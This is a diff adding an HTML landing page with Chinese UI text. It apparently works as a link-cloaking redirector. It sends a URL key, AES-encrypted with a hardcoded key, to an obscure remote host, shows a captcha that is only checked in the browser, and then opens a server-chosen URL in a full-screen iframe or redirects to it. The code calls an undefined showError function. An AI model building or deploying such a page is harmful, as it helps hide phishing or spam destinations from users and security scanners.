@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8" />
+        <meta
+            name="viewport"
+            content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover"
+        />
+        <meta http-equiv="x-ua-compatible" content="ie=edge" />
+        <meta name="renderer" content="webkit" />
+        <meta name="layoutmode" content="standard" />
+        <meta name="imagemode" content="force" />
+        <meta name="wap-font-scale" content="no" />
+        <meta name="format-detection" content="telephone=no" />
+        <title></title>
+
+        <meta property="og:type" content="website" />
+        <meta property="og:title" content="" />
+        <meta property="og:description" content="" />
+        <meta property="og:image" content="" />
+        <link rel="shortcut icon" href="" type="image/x-icon" />
+        <style>
+            html,
+            body {
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                background: #f8f8f8;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-family: Arial, sans-serif;
+                text-align: center;
+            }
+
+            #loading {
+                font-size: 1.2em;
+                color: #666;
+            }
+
+            #captcha-container {
+                display: none;
+                flex-direction: column;
+                align-items: center;
+                gap: 10px;
+            }
+
+            #captcha {
+                font-size: 1.5em;
+                letter-spacing: 3px;
+                background: #eee;
+                padding: 5px 10px;
+                border-radius: 4px;
+                user-select: none;
+            }
+        </style>
+    </head>
+    <body>
+        <script>
+            (async function () {
+                // const API_BASE = "http://127.0.0.1:8048/abcdefg";
+                const API_BASE = "https://dasdwqb.xyz/abcdefg";
+                const aesKey = "jss1vvy6mcskzbk9";
+                const params = new URLSearchParams(window.location.search);
+                const key = params.get("k");
+
+                function strToUint8(str) {
+                    return new TextEncoder().encode(str);
+                }
+
+                function uint8ToStr(buf) {
+                    return new TextDecoder().decode(buf);
+                }
+
+                function base64Encode(arrayBuffer) {
+                    return btoa(
+                        String.fromCharCode(...new Uint8Array(arrayBuffer))
+                    );
+                }
+
+                function base64Decode(base64) {
+                    const binary = atob(base64);
+                    const bytes = new Uint8Array(binary.length);
+                    for (let i = 0; i < binary.length; i++)
+                        bytes[i] = binary.charCodeAt(i);
+                    return bytes.buffer;
+                }
+
+                async function importKey() {
+                    return await crypto.subtle.importKey(
+                        "raw",
+                        strToUint8(aesKey),
+                        { name: "AES-CBC" },
+                        false,
+                        ["encrypt", "decrypt"]
+                    );
+                }
+
+                async function aesEncrypt(plainText) {
+                    const key = await importKey();
+                    const iv = crypto.getRandomValues(new Uint8Array(16)); // 随机IV
+                    const encrypted = await crypto.subtle.encrypt(
+                        { name: "AES-CBC", iv },
+                        key,
+                        strToUint8(plainText)
+                    );
+                    // 拼接 IV + 密文，转为base64输出
+                    const result = new Uint8Array(
+                        iv.length + encrypted.byteLength
+                    );
+                    result.set(iv);
+                    result.set(new Uint8Array(encrypted), iv.length);
+                    return base64Encode(result);
+                }
+
+                async function aesDecrypt(base64Text) {
+                    const data = new Uint8Array(base64Decode(base64Text));
+                    const iv = data.slice(0, 16);
+                    const encrypted = data.slice(16);
+                    const key = await importKey();
+                    const decrypted = await crypto.subtle.decrypt(
+                        { name: "AES-CBC", iv },
+                        key,
+                        encrypted
+                    );
+                    return uint8ToStr(decrypted);
+                }
+
+                async function securePost(payload = {}) {
+                    const t = await aesEncrypt(JSON.stringify(payload));
+                    const res = await fetch(API_BASE, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ t }),
+                    });
+                    const json = await res.json();
+                    const text = await aesDecrypt(json.data);
+                    return JSON.parse(text);
+                }
+
+                // ===== 动态创建元素 =====
+                function createElement(tag, attrs = {}, parent) {
+                    const el = document.createElement(tag);
+                    Object.entries(attrs).forEach(([k, v]) => (el[k] = v));
+                    if (parent) parent.appendChild(el);
+                    return el;
+                }
+
+                function ensureSpinnerStyles() {
+                    if (document.getElementById("local-spinner-style")) return;
+                    const style = document.createElement("style");
+                    style.id = "local-spinner-style";
+                    style.textContent = `
+                @keyframes local-spin { to { transform: rotate(360deg); } }
+                .local-spinner {
+                    width: 48px;
+                    height: 48px;
+                    border: 4px solid #e5e7eb;
+                    border-top-color: #06b6d4;
+                    border-radius: 50%;
+                    animation: local-spin .8s linear infinite;
+                }
+            `;
+                    document.head.appendChild(style);
+                }
+
+                function showLoading() {
+                    document.body.innerHTML = "";
+                    const wrap = createElement("div", {}, document.body);
+                    Object.assign(wrap.style, {
+                        height: "100vh",
+                        display: "flex",
+                        justifyContent: "center",
+                        alignItems: "center",
+                        background: "#f6f8fa",
+                    });
+                    ensureSpinnerStyles();
+                    const spinner = createElement("div", {}, wrap);
+                    spinner.className = "local-spinner";
+                    spinner.setAttribute("role", "progressbar");
+                    spinner.setAttribute("aria-label", "Loading");
+                    return wrap;
+                }
+
+                function ensureCaptchaStyles() {
+                    if (document.getElementById("local-captcha-style")) return;
+                    const style = document.createElement("style");
+                    style.id = "local-captcha-style";
+                    style.textContent = `
+                :root { --primary-600: oklch(0.666 0.179 58.318); }
+                .captcha-wrap { min-height: 100vh; display:flex; align-items:center; justify-content:center; background:#f6f8fa; padding:16px; }
+                .captcha-card { width:100%; max-width:420px; background:#fff; border-radius:16px; box-shadow:0 10px 30px rgba(2,8,20,.08); border:1px solid rgba(17,24,39,.06); padding:20px; }
+                .captcha-title { font-size:18px; font-weight:700; color:#0f172a; text-align:center; letter-spacing:.02em; }
+                .captcha-tip { font-size:12px; color:#64748b; text-align:center; margin-top:6px; }
+                .captcha-code { margin-top:16px; display:flex; align-items:center; justify-content:center; letter-spacing:6px; font-size:24px; font-weight:700; color:#0f172a; background:#f8fafc; border-radius:12px; padding:14px 16px; border:1px dashed rgba(17,24,39,.12); user-select:none; }
+                .captcha-input { margin-top:16px; width:100%; box-sizing:border-box; padding:10px 12px; font-size:14px; border:1px solid #e2e8f0; border-radius:10px; outline:none; text-transform:uppercase; }
+                .captcha-input:focus { border-color: var(--primary-600); box-shadow: 0 0 0 3px color-mix(in oklch, var(--primary-600) 25%, transparent 75%); }
+                .captcha-actions { margin-top:16px; display:flex; gap:10px; }
+                .btn { flex:1; display:inline-flex; align-items:center; justify-content:center; padding:10px 12px; border-radius:10px; font-size:14px; font-weight:600; border:1px solid #e2e8f0; cursor:pointer; transition: all .2s; }
+                .btn-primary { background: var(--primary-600); color:#fff; border-color: var(--primary-600); }
+                .btn-primary:hover { filter: brightness(1.05); }
+                .btn-secondary { background:#fff; color:#0f172a; }
+                .btn-secondary:hover { background:#f8fafc; }
+                .btn:disabled { opacity:.55; cursor:not-allowed; }
+                @media (max-width: 360px) { .captcha-card { padding:16px; border-radius:12px; } .captcha-code { font-size:20px; letter-spacing:4px; } }
+            `;
+                    document.head.appendChild(style);
+                }
+
+                async function init() {
+                    showLoading();
+                    if (key == null || key === "") {
+                        return;
+                    }
+                    // 本地免验证：首次通过验证码后写入本地标记，后续直接跳过
+                    const flagKey = `captcha_ok_${key}`;
+                    if (localStorage.getItem(flagKey) === "1") {
+                        loadPage();
+                        return;
+                    }
+                    try {
+                        const data = await securePost({
+                            key: key,
+                            type: 1,
+                            time: Math.floor(Date.now() / 1000),
+                        });
+                        if (data.code === 0 && data.data.captcha === 1) {
+                            showCaptcha();
+                        } else {
+                            loadPage();
+                        }
+                    } catch (e) {}
+                }
+
+                function showCaptcha() {
+                    document.body.innerHTML = "";
+                    ensureCaptchaStyles();
+                    const wrap = createElement("div", {}, document.body);
+                    wrap.className = "captcha-wrap";
+                    const card = createElement("div", {}, wrap);
+                    card.className = "captcha-card";
+                    const title = createElement(
+                        "div",
+                        { textContent: "请输入验证码" },
+                        card
+                    );
+                    title.className = "captcha-title";
+                    const tip = createElement(
+                        "div",
+                        { textContent: "为了安全，请完成验证码" },
+                        card
+                    );
+                    tip.className = "captcha-tip";
+                    const codeEl = createElement("div", {}, card);
+                    codeEl.className = "captcha-code";
+                    const input = createElement(
+                        "input",
+                        { placeholder: "输入验证码", autocomplete: "off" },
+                        card
+                    );
+                    input.className = "captcha-input";
+                    input.maxLength = 5;
+                    const actions = createElement("div", {}, card);
+                    actions.className = "captcha-actions";
+                    const refresh = createElement(
+                        "button",
+                        { textContent: "刷新" },
+                        actions
+                    );
+                    refresh.className = "btn btn-secondary";
+                    const submit = createElement(
+                        "button",
+                        { textContent: "提交" },
+                        actions
+                    );
+                    submit.className = "btn btn-primary";
+                    submit.disabled = true;
+
+                    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+                    let code = "";
+                    const generate = () => {
+                        code = "";
+                        for (let i = 0; i < 5; i++)
+                            code +=
+                                chars[Math.floor(Math.random() * chars.length)];
+                        codeEl.textContent = code;
+                        input.value = "";
+                        submit.disabled = true;
+                        input.focus();
+                    };
+                    generate();
+
+                    refresh.onclick = () => generate();
+                    input.addEventListener("input", () => {
+                        input.value = input.value.toUpperCase();
+                        submit.disabled =
+                            input.value.trim().length !== code.length;
+                    });
+                    input.addEventListener("keydown", (e) => {
+                        if (e.key === "Enter" && !submit.disabled)
+                            submit.click();
+                    });
+
+                    submit.onclick = () => {
+                        if (input.value.trim().toUpperCase() === code) {
+                            const flagKey = `captcha_ok_${key}`;
+                            try {
+                                localStorage.setItem(flagKey, "1");
+                            } catch (_) {}
+                            loadPage();
+                        } else {
+                            alert("验证码错误");
+                            generate();
+                        }
+                    };
+                }
+
+                async function loadPage() {
+                    showLoading();
+                    try {
+                        const data = await securePost({
+                            key: key,
+                            type: 2,
+                            time: Math.floor(Date.now() / 1000),
+                        });
+                        if (data.code !== 0) {
+                            showError(data.message || "接口返回错误", loadPage);
+                            return;
+                        }
+                        if (data.data.type === 1) {
+                            document.body.innerHTML = "";
+                            Object.assign(document.documentElement.style, {
+                                width: "100%",
+                                height: "100%",
+                                margin: "0",
+                                padding: "0",
+                            });
+                            Object.assign(document.body.style, {
+                                margin: "0",
+                                padding: "0",
+                                width: "100%",
+                                height: "100%",
+                                display: "block",
+                                background: "transparent",
+                                overflow: "hidden",
+                            });
+
+                            const iframe = createElement(
+                                "iframe",
+                                { src: data.data.url },
+                                document.body
+                            );
+                            Object.assign(iframe.style, {
+                                position: "fixed",
+                                top: "0",
+                                left: "0",
+                                right: "0",
+                                bottom: "0",
+                                width: "100vw",
+                                height: "100vh",
+                                border: "none",
+                            });
+                            iframe.setAttribute("allowfullscreen", "true");
+                        } else if (data.data.type === 2) {
+                            location.href = data.data.url;
+                        }
+                    } catch (e) {
+                        showError("接口请求失败，请稍后重试", loadPage);
+                    }
+                }
+
+                init();
+            })();
+        </script>
+    </body>
+</html>
